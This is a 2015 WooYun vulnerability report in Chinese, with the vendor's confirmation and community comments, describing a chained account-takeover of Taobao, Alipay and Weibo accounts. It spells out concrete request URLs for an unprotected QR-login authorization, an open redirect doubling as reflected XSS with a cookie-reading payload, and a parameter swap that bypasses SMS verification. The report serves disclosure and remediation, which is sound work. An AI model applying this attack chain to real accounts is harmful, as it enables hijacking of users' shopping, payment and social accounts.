{"id": 44456, "wybug_id": "wooyun-2015-099486", "wybug_title": "微博上点开我发的链接我就可登进你的淘宝支付宝和微博可盗号可挂马（poc中附若干从洞）", "wybug_corp": "阿里巴巴", "wybug_author": "呆子不开口", "wybug_date": "2015-03-04 16:58", "wybug_open_date": "2015-04-24 13:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-04：\t该漏洞正等待厂商内部评估\t\t\t\t\t\t\t\t\t2015-03-05：\t厂商已经确认，与白帽子共同解决该漏洞中，漏洞信息仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-24：\t细节向公众公开  简要描述： 微博上点开我发的新闻，我就进了你的淘宝支付宝和微博，从此我就对你的人生多了几分了解。利用过程中还利用了两个其他漏洞，一个是跳转漏洞（也可以是绕过xss filter的反射xss），一个是异常登录短信或动态口令认证的绕过，就在这一并提交了 详细说明： 漏洞一、淘宝的二维码扫描登录功能存在劫持漏洞用户登陆的二维码，格式如下：\nhttp://ma.taobao.com/rl/ebc9d0e7d1af2fd18e7aee1ed1f8ebbd\n用户用手机扫描后，会在登录状态下去访问一个请求来给此二维码的值授权，然后需要用户点击确认，然后完成授权。这时浏览器端的会用授权后的参数去服务端获取登陆凭证，然后来登陆但是，扫描后的用户确认页无意义，因为最终的授权请求格式如下：\npost: http://login.m.taobao.com/qrcodeLoginAuthor.do?qr_t=s参数为shortURL，值为上面的二维码的值 http://ma.taobao.com/rl/ebc9d0e7d1af2fd18e7aee1ed1f8ebbd\n这里面的所有参数都是可猜测的，未加token保护。攻击者可以把shortUR参数换成他的二维码中的shortUR，然后直接欺骗登录用户去点击完成授权我们可以获取到最终的登陆凭证格式如下：\nhttps://login.taobao.com/member/loginByIm.do?uid=cntaobaousername&token=0104de9b4363476712b9597780a70a00&time=1425148510364&asker=qrcodelogin&ask_version=1.0.0&defaulturl=http%3A%2F%2Fwww.taobao.com%2F&webpas=1b04fa6f6901df787ce9da8848d1a23d2121730000\n经测试发现，不管是用户登陆的是web版还是移动端淘宝，都可对此请求完成授权就是说，只要用户在登陆状态下，不管是电脑还是移动端，只要点了我的链接，我就能用它的身份登陆淘宝了漏洞二、互联网的便捷扩大了危害很多人的淘宝是未登陆状态的，而且我没法直接对话那么多登陆了淘宝的用户，所以看起来只能搞搞熟人或是买家卖家怎样和跟多的淘宝用户互动呢？我扶了扶镜框，发现微博上很多用户都绑定了淘宝账号。而且，即使你没登陆淘宝，微博的某些功能可以帮你自动登陆淘宝如果你绑定了淘宝，你在微博或客户端微博上访问 \nhttp://api.weibo.com/t_short_url?outUrl=http://www.taobao.com\n浏览器会帮你自动登陆淘宝，所以思路就有了，让用户先自动登陆淘宝，再去访问我们的攻击请求但由于此请求不让被iframe，所以我只能通过taobao.com域的跳转漏洞来让用户在登陆后再去访问我们的攻击请求哪有跳转漏洞呢？我扶了扶镜框，果然发现了一个：\nhttp://www.taobao.com/webww/redirect.htm?ssshttp://www.baidu.com?\n当然，你看它的漏洞原理的话，它还可以是一个反射的xss，浏览器的xssfilter对它无效漏洞出在js的跳转里，未对跳转目标进行校验\nhttp://www.taobao.com/webww/redirect.htm?sssjavascript:alert(document.cookie);//\n这样，只要在微博上发这样一个请求\nhttp://api.weibo.com/t_short_url?outUrl=http://www.taobao.com/webww/redirect.htm?ssshttp://***********/tm.php?\n用户点击后就相当于登陆了淘宝，又扫了我们的二维码了漏洞三、绕过异常登录的短信认证或动态口令认证我们拿到用户授权，去服务端获取完凭证后，用如下格式的链接去访问\nhttps://login.taobao.com/member/loginByIm.do?uid=cntaobaousername&token=0104de9b4363476712b9597780a70a00&time=1425148510364&asker=qrcodelogin&ask_version=1.0.0&defaulturl=http%3A%2F%2Fwww.taobao.com%2F&webpas=1b04fa6f6901df787ce9da8848d1a23d2121730000\n会发现，除了同城的一些用户，大部分用户的访问都被识别成异常登陆了，会弹出个短信或者动态口令认证通过改IP等方式，可以偶尔绕过一些，但成功率不高怎么才能完美绕过呢？我扶了扶镜框，发现了一个方法在阿里旺旺里，也有个内嵌页面的自动登陆，格式如下：\nhttp://login.taobao.com/member/loginByIm.do?_input_charset=utf-8&uid=cntaobaousernam&token=9d01ce33876e184b04d2ec03378fd134&act=SignIn&time=1425384138614&fromInnerIE=1&asker=AliIM&asker_version=8.00.43C&defaulturl=http%3a%2f%2fteam.taobao.com%2fphoneapp3%2fspread_and_home_page.htm%3fver%3d8.00.43C%26msgid%3d0%26uid%3dcntaobaousername%26cssname%3ddefault&webpas=cntaobaousernam---5494c4032a24c4e20c9ba758c889fe9d1523497202---\n把我们的凭证里的几个主要参数，替换到这个请求中，也可以完成登陆，而且绕过了短信认证，我测试了，是100%的绕过具体是哪个参数影响的，我没细看，应该是defaulturl和fromInnerIE此类的四、登陆进淘宝后，可以直接访问支付宝，还可以直接自动登陆用户的微博所以说账号打通后，只会降低双方的安全性。因为你们同时不出事的概率小了点  漏洞证明： 需要测试的poc可以联系我证明的截图和视频如下：其他用户的淘宝：\n\n短信认证\n\n绕过后\n\n\n\n\n\n\n\n\n\n视频如下，密码是238191如果打不开视频，可以下载视频，地址如下链接: http://pan.baidu.com/s/1qWnz6dm 密码: q9qm  修复方案： 1、扫描二维码后的确认请求，加token保护2、js跳转需要校验目标3、认证风控策略要统一，不要留一些弱策略的口子，不要有短板  版权声明：转载请注明来源 呆子不开口@乌云\n ", "wybug_reply": "漏洞回应 厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-05 13:38 厂商回复： 漏洞已确认真实存在，并已安排人处理。 最新状态： 暂无 ", "replys": "漏洞评价：\n评论\n     2015-03-04 17:18 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  好长的标题，好萌的漏洞    \n     2015-03-04 17:22 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:25        | 求各种兼职)\t\t \n  @疯狗 标题都被你们改了，我写的是从此对你的人生多了几分了解，多有诗意，你们的ceo审美太差，不配一个诗人    \n     2015-03-04 18:13 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @呆子不开口  湿人你好。    \n     2015-04-04 20:01 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  我竟然完整的看到了，908cd5d48bceba9af53303c13e6bc73d    \n     2015-04-05 12:34 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  先留个名    \n     2015-04-24 14:11 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:163        | 努力让某某某成为最幸福的女人！)\t\t \n  看完了，牛逼！    \n     2015-04-24 14:14 |    \t\t健宇 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:14        | tools kid)\t\t \n  留    \n     2015-04-24 14:16 |    \t\t我饿啦!! \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 哈哈)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-04-24 14:35 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-04-24 14:37 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-04-24 14:47 |    \t\t飘过的红花 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | 研究漏洞的方法、方式、工具及手段等是合法...)\t\t \n  一环套一环    \n     2015-04-24 14:56 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-04-24 15:00 |    \t\t0x334 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:35        | 漏洞无影响，已忽略～～～～～～～)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-04-24 15:02 |    \t\tpapaver \t\t\t( 普通白帽子  |\t\t\t        Rank:197 漏洞数:35        | 95后，高一学生一枚... 萌萌哒..)\t\t \n  这么牛逼的 为啥没有放首页呢？ 之前都没有看到啊 。。。     \n     2015-04-24 15:07 |    \t\t紫藤居士 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:8        | 我是来向大神们学习的)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-04-24 15:10 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  你骗我，你的链接并没有女生拍裸照发到qq空间好看    \n     2015-04-24 15:19 |    \t\t暗羽 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:6        | 喵呜，给人类的智商跪了)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-04-24 15:36 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  到头来是token惹的祸？    \n     2015-04-24 15:44 |    \t\t圣路西法 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 围观大神ส็็็็็็ ̷̸̨̀͒̏̃ͦ...)\t\t \n  请问你那眼镜哪买的? 我也要一个    \n     2015-04-24 16:19 |    \t\ttodaro \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:12        | 完结。)\t\t \n  又一个SSO带来的问题。    \n     2015-04-24 19:26 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  请问你那眼镜哪买的? 我也要一个    \n     2015-04-24 19:28 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  为什么在/corp_detail.php?corp=阿里巴巴这里看不到这个洞    \n     2015-04-24 19:43 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  镜框威力好大..    \n     2015-04-24 20:05 |    \t\t疯狂的dabing \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | Hehe is golden.)\t\t \n  @夏殇 有趣的发现    \n     2015-04-24 22:38 |    \t\tConstantine \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 不交450谁也保不了你)\t\t \n  请问你那眼镜哪买的? 我也要一个    \n     2015-04-25 18:29 |    \t\t屠龙宝刀点击就送 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 简要介绍不能为空)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-04-25 19:13 |    \t\t斯杰 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | By：S丶jer)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-05-04 23:01 |    \t\twutoupal \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 我是新人)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-05-05 16:10 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  扶了扶眼镜框.    \n     2015-05-05 17:27 |    \t\tYinkan \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 码农)\t\t \n  扶了扶眼镜框    \n     2015-05-05 19:24 |    \t\tLucaroot \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:8        | 123)\t\t \n  请问你那眼镜哪买的? 我也要一个.    \n     2015-05-05 21:23 |    \t\tcf_hb \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:17        | 爱生活，爱安全！)\t\t \n  太厉害了！    \n     2015-05-17 00:20 |    \t\t雏鹰 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 关注互联网的那些事、关注web安全、关注安...)\t\t \n  各种攻击    \n     2015-08-21 17:08 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  我扶了扶镜框，发现我没戴眼镜。。。已瞎    \n     2015-08-24 09:47 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  我扶了扶镜框，然而什么也没发现    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}